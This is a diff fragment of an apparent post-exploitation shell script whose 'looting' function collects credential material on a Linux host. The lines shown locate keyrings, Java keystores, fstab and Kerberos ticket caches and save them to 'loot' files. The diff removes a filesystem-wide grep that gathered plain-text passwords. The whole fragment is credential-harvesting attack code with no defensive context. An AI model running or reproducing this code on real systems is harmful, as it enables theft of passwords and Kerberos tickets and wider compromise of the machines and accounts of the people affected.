@@ -126,8 +126,6 @@ looting() {
     locate login.keyring; locate user.keystore | tee -a loot/files_to_check.txt
     echo "======================= /etc/fstab:" | tee -a loot/files_to_check.txt
     locate /etc/fstab | tee -a loot/files_to_check.txt
-    echo "======================= PLAIN TEXT PASSWORDS:" | tee -a loot/plain_text_pass.txt
-    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2>/dev/null | tee -a loot/plain_text_pass.txt
     echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
     env | grep KRB5CCNAME | tee -a loot/kerberos.txt
     find / -name "krb5cc_*" 2>/dev/null
